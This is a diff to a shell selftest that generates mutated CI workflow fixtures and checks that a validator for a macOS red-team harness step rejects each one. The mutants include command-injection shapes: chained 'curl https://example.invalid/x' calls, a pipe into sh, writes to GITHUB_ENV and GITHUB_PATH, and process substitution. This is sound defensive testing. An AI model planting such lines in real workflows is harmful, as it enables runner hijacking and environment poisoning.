+        _bq_in '/--settings "[$]RUNNER_TEMP\/c73\/a[.]json" --measure / { sub(/--measure /, "--measure C42R,") } { print }' > "$d/bm/m123.yml"
+        _bq_ad m124 "$_bq_hp --x-candidate > \"\$RUNNER_TEMP/macos-out/c73-a.out\" 2>&1 || :"
+        _bq_in '{ print } /candidate-literal[.]json" --measure C42 [|][|] :$/ { print "          sh conformance/boundary-redteam.sh --a-candidate b || :" }' > "$d/bm/m125.yml"
+        _bq_in '/--c73-candidate A / { sub(/"[$]RUNNER_TEMP\/c73\/a[.]json"/, "\"$GITHUB_ENV\"") } { print }' > "$d/bm/m126.yml"
+        _bq_in '/--c73-candidate A / { sub(/"[$]RUNNER_TEMP\/c73\/a[.]json"/, "\"$GITHUB_PATH\"") } { print }' > "$d/bm/m126b.yml"
+        _bq_in '/--c73-candidate A / { sub(/ [|][|] :$/, " <<J || :") } { print }' > "$d/bm/m127.yml"
+        _bq_ad m128 "          jq '.sandbox.filesystem.denyWrite += [\"x\"]' .claude/settings.json > \"\$RUNNER_TEMP/c73/a.json\" || :"
+        _bq_in '/--c73-candidate A / { sub(/ [|][|] :$/, " ; curl https://example.invalid/x || :") } { print }' > "$d/bm/m129.yml"
+        _bq_in '/--c73-candidate A / { sub(/ [|][|] :$/, " && curl https://example.invalid/x || :") } { print }' > "$d/bm/m129b.yml"
+        _bq_in '/--c73-candidate A / { sub(/ [|][|] :$/, " | sh || :") } { print }' > "$d/bm/m129c.yml"
+        _bq_in '/--c73-candidate A / { sub(/ [|][|] :$/, " & curl https://example.invalid/x || :") } { print }' > "$d/bm/m129d.yml"
+        _bq_in '/--c73-candidate A / { sub(/--settings [.]claude\/settings[.]json/, "--settings <(cat .claude/settings.json)") } { print }' > "$d/bm/m130.yml"
+        _bq_in '/--c73-candidate A / { sub(/ > "/, " > >(tee x) > \"") } { print }' > "$d/bm/m130b.yml"
+        _bq_in '/--c73-candidate A / { sub(/c73\/a[.]json/, "c42/candidate.json") } { print }' > "$d/bm/m131.yml"
+        _bq_in '/--c73-candidate A / { sub(/ > "/, " >> \"") } { print }' > "$d/bm/m131b.yml"
+        _bq_in '/--c73-candidate A / { sub(/c73\/a[.]json/, "c73/../a.json") } { print }' > "$d/bm/m131c.yml"
+        _bq_in '/--c73-candidate A / { sub(/[$]RUNNER_TEMP\/c73/, "${RUNNER_TEMP}/c73") } { print }' > "$d/bm/m131d.yml"
+        _bq_in '/--c73-candidate A / { sub(/ > "/, " --stub x > \"") } { print }' > "$d/bm/m132.yml"
+        _bq_in '/c73-a[.]out/ { sub(/--measure C73k/, "--measure C1,C73k") } { print }' > "$d/bm/m132b.yml"
+        _bq_in '/c73-a[.]out/ { sub(/C73F >/, "C73F,C36 >") } { print }' > "$d/bm/m132c.yml"
+        _bq_in '/c73-a[.]out/ { sub(/ > "/, " --report-only > \"") } { print }' > "$d/bm/m132d.yml"
         _bq_in '/^          echo "C42R real-path cell, alone/ { print "          echo ${{ inputs.profile }}" } { print }' > "$d/bm/m91.yml"
         _bq_in '/^        description: / { sub(/Which slice/, "Which inputs.profile slice") } { print }' > "$d/bm/m92.yml"
         _bq_in '/^          echo "C42R real-path cell, alone/ { print "          # ${{ inputs.profile }}" } { print }' > "$d/bm/m93.yml"
@@ -3774,7 +3840,35 @@ selftest() {
                      "m112|extras step's run body|BR112|a candidate line with a dollar-paren command" \
                      "m113|extras step's run body|BR113|a candidate line piping into sh" \
                      "m114|extras step's run body|BR114|a candidate line chaining with &&" \
-                     "m115|extras step's run body|BR115|a candidate line redirecting into C42R.out (the C42R output, in another case)"; do
+                     "m115|extras step's run body|BR115|a candidate line redirecting into C42R.out (the C42R output, in another case)" \
+                     "m118|extras step's run body|BR118|the D candidate pair missing (three pairs, not four)" \
+                     "m118b|extras step's run body|BR118b|a pair's build and measure lines swapped" \
+                     "m118c|extras step's run body|BR118c|candidate A built into b.json (a pair's letter mismatched)" \
+                     "m119|or one of the eight pinned SWAS-564 C73 candidate lines|BR119|the full arm gaining C73z while the pinned measure lines keep the old cell list" \
+                     "m120|extras step's run body|BR120|a --c73-candidate line the generic rule would accept (no redirect, a foreign c73/ settings file)" \
+                     "m121|extras step's run body|BR121|the same --c73-candidate line with a fresh macos-out redirect" \
+                     "m122|extras step's run body|BR122|a generic candidate line naming an upper-case C73/ path" \
+                     "m123|or one of the eight pinned SWAS-564 C73 candidate lines|BR123|the pinned A measure line with C42R, prefixed to its cell list (a near-miss)" \
+                     "m124|extras step's run body|BR124|a generic candidate line writing c73-a.out" \
+                     "m125|may only follow the last pinned|BR125|a valid generic candidate line between the literal control and the first pair" \
+                     "m126|must not change how its steps run|BR126|the A build redirected to the GITHUB_ENV file" \
+                     "m126b|must not change how its steps run|BR126b|the A build redirected to the GITHUB_PATH file" \
+                     "m127|extras step's run body|BR127|a heredoc opened on the A build line" \
+                     "m128|extras step's run body|BR128|a jq line (not the harness) building a c73 settings file" \
+                     "m129|extras step's run body|BR129|a ; command chained after the A build line" \
+                     "m129b|extras step's run body|BR129b|a && command chained after the A build line" \
+                     "m129c|extras step's run body|BR129c|a pipe into sh after the A build line" \
+                     "m129d|extras step's run body|BR129d|a single & command after the A build line" \
+                     "m130|extras step's run body|BR130|a <( process substitution as the A build's settings file" \
+                     "m130b|extras step's run body|BR130b|a >( process substitution as the A build's redirect" \
+                     "m131|extras step's run body|BR131|the A build writing outside c73/" \
+                     "m131b|extras step's run body|BR131b|the A build appending with >>" \
+                     "m131c|extras step's run body|BR131c|the A build writing through a .. path" \
+                     "m131d|extras step's run body|BR131d|the A build naming the RUNNER_TEMP brace form" \
+                     "m132|extras step's run body|BR132|an extra --stub flag on the A build line" \
+                     "m132b|report-only extra|BR132b|a non-C73 cell (C1) on the A measure line" \
+                     "m132c|report-only extra|BR132c|a non-C73 cell (C36) appended to the A measure list" \
+                     "m132d|report-only extra|BR132d|an extra --report-only flag on the A measure line"; do
           _bq_f=${_bq_m%%|*}; _bq_r=${_bq_m#*|}; _bq_want=${_bq_r%%|*}; _bq_r=${_bq_r#*|}
           _bq_id=${_bq_r%%|*}; _bq_desc=${_bq_r#*|}
           _bq_ci="$_br_real"; _bq_mf="$d/bm/$_bq_f.yml"
@@ -3891,13 +3985,45 @@ selftest() {
           _bq_fc "$_bq_kd-M" "$d/bm/$_bq_kf.yml" - "$_bq_ks" "extras step's run body" "$_bq_kw"
         done
         # BR116: a candidate line with a redirect to a fresh macos-out name stays green (the positive control for the redirect arm of the allowlist)
-        if check_boundary_macos_leg "$_br_real" "$d/bm/m116.yml" >/dev/null 2>&1; then
+        if ! cmp -s "$_bq_mac" "$d/bm/m116.yml" && check_boundary_macos_leg "$_br_real" "$d/bm/m116.yml" >/dev/null 2>&1; then
           echo "selftest PASS: BR116 — a --<id>-candidate line redirecting to a fresh macos-out/*.out name (2>&1 || :) is accepted"
-        else echo "selftest FAIL: BR116 — a --<id>-candidate line redirecting to a fresh macos-out/*.out name was refused"; sf=1; fi
+        else echo "selftest FAIL: BR116 — a --<id>-candidate line redirecting to a fresh macos-out/*.out name was refused, or its fixture equals the real file (nothing was planted)"; sf=1; fi
         # BR103: the one shape a slice may add (a --<id>-candidate harness line ending '|| :') stays green, so the exact compare does not block the documented extension
-        if check_boundary_macos_leg "$_br_real" "$d/bm/m103.yml" >/dev/null 2>&1; then
+        if ! cmp -s "$_bq_mac" "$d/bm/m103.yml" && check_boundary_macos_leg "$_br_real" "$d/bm/m103.yml" >/dev/null 2>&1; then
           echo "selftest PASS: BR103 — a clean --<id>-candidate harness line added to the extras step is accepted"
-        else echo "selftest FAIL: BR103 — a clean --<id>-candidate harness line added to the extras step was refused"; sf=1; fi
+        else echo "selftest FAIL: BR103 — a clean --<id>-candidate harness line added to the extras step was refused, or its fixture equals the real file (nothing was planted)"; sf=1; fi
+        # BR117 (SWAS-564): the real body (the seven fixed lines, the four pinned pairs, the renamed step) is accepted, and the four build lines are really there (the PASS is not vacuous)
+        if check_boundary_macos_leg "$_br_real" "$_bq_mac" >/dev/null 2>&1 && [ "$(awk '/^          sh conformance\/boundary-redteam[.]sh --c73-candidate (A|A1|B|D) --settings [.]claude\/settings[.]json > "[$]RUNNER_TEMP\/c73\/[a-z0-9]+[.]json" [|][|] :$/ { n++ } END { print n + 0 }' "$_bq_mac")" = 4 ]; then
+          echo "selftest PASS: BR117 — the extras step's seven fixed lines and the four pinned SWAS-564 C73 candidate pairs (A, A1, B, D) are accepted"
+        else echo "selftest FAIL: BR117 — the real extras body with the four pinned C73 candidate pairs was refused, or the four build lines are not there"; sf=1; fi
+        # BR117-BR125 -M (SWAS-564): each weakens ONE clause of the new lock and must flip its cell. BR117-M is the one positive-cell mutant (the generator emits no pair, so the real body must now RED); the others weaken a clause so the planted line is
+        # dropped or admitted and the rest of the function runs to its end clean (rc 0), while the shipped function (the cell in the main loop) reds naming its cause.
+        _bq_fk() {  # <id> <fixture the shipped function accepts> <weaken sed> <want> <what>: the weakened function copy must RUN to its end and RED on the fixture, naming <want>
+          if [ -z "$_bq_fn" ]; then echo "selftest FAIL: $1 — the shipped check_boundary_macos_leg could not be extracted from $0"; sf=1; return 0; fi
+          _bk_w=$(printf '%s\n' "$_bq_fn" | sed "$3")
+          if [ "$_bk_w" = "$_bq_fn" ]; then echo "selftest FAIL: $1 — the weaken rewrite equals the shipped function (a tag or a pattern is gone)"; sf=1; return 0; fi
+          if _bk_o=$( ( unset -f check_boundary_macos_leg; eval "$_bk_w"; command -v check_boundary_macos_leg >/dev/null || { echo NOT-DEFINED; exit 97; }; _bk_c=0; check_boundary_macos_leg "$_br_real" "$2" || _bk_c=$?; echo "BQ-RAN rc=$_bk_c"; exit "$_bk_c" ) 2>&1 ); then _bk_rc=0; else _bk_rc=$?; fi
+          case "$_bk_o" in
+            *"syntax error"*|*"not found"*|*NOT-DEFINED*) echo "selftest FAIL: $1 — $5: the weakened function failed to evaluate, so a red proves nothing: $_bk_o"; sf=1; return 0 ;;
+            *"BQ-RAN rc="*) ;;
+            *) echo "selftest FAIL: $1 — $5: the weakened function did not run to its end (no BQ-RAN marker): $_bk_o"; sf=1; return 0 ;;
+          esac
+          if [ "$_bk_rc" = 0 ]; then echo "selftest FAIL: $1 — $5: the weakened function still accepts the real body, so the cell has no teeth"; sf=1; return 0; fi
+          case "$_bk_o" in
+            *"$4"*) echo "selftest PASS: $1 — $5 (clause weakened -> the real body REDs, naming '$4'; the cell has teeth)" ;;
+            *) echo "selftest FAIL: $1 — $5: the weakened function reds without naming '$4': $_bk_o"; sf=1 ;;
+          esac
+        }
+        _bq_wz='/# BRMZ$/s/ok = 0/ok = ok/'
+        _bq_fk BR117-M "$_bq_mac" '/# BRMP$/s/in A A1 B D;/in;/' "or one of the eight pinned SWAS-564 C73 candidate lines" "the generator emitting no candidate pair"
+        _bq_fc BR118-M "$d/bm/m118.yml" - '/# BRMP$/s/in A A1 B D;/in A A1 B;/' "extras step's run body" "the generator emitting three pairs (D dropped), so a body missing D reads as pinned"
+        _bq_fc BR119-M "$d/bm/m119.yml" - '/# BRML$/s/^.*$/  _bm_cl=C73k,C73T,C73Tw,C73b0,C73g,C73g2,C73gt,C73s,C73d,C73r,C73w,C73c,C73m,C73u,C73b,C73h,C73F/' "or one of the eight pinned SWAS-564 C73 candidate lines" "the measured cell list a literal in the lock, not derived from the full arm" "full profile's cell set differs"
+        _bq_fc BR120-M "$d/bm/m120.yml" - "$_bq_wz" "extras step's run body" "a --c73-candidate line accepted by the generic rule (BRMZ removed)"
+        _bq_fc BR121-M "$d/bm/m121.yml" - "$_bq_wz" "extras step's run body" "a --c73-candidate line with a fresh redirect accepted by the generic rule (BRMZ removed)"
+        _bq_fc BR122-M "$d/bm/m122.yml" - '/# BRMZ$/s/tolower([$]0)/$0/' "extras step's run body" "an upper-case C73/ path accepted by the generic rule (BRMZ made case-sensitive)"
+        _bq_fc BR123-M "$d/bm/m123.yml" - '/# BRMD$/s/([$]0 in pin)/(index($0, "--measure C") > 0)/' "or one of the eight pinned SWAS-564 C73 candidate lines" "BRMD admitting any --measure C... line, not the exact pinned strings" "extras step's run body"
+        _bq_fc BR124-M "$d/bm/m124.yml" - '/# BRMG$/s|c73-/|zzz-/|' "extras step's run body" "a generic line writing c73-a.out accepted (c73-* no longer reserved)"
+        _bq_fc BR125-M "$d/bm/m125.yml" - '/# BRMO$/s/bad = 1/bad = 0/' "may only follow the last pinned" "a generic candidate line before the first pair accepted (BRMO removed)"
       else
         echo "selftest FAIL: BR0m — the real macOS workflow is not sound (SWAS-552)"; sf=1
       fi
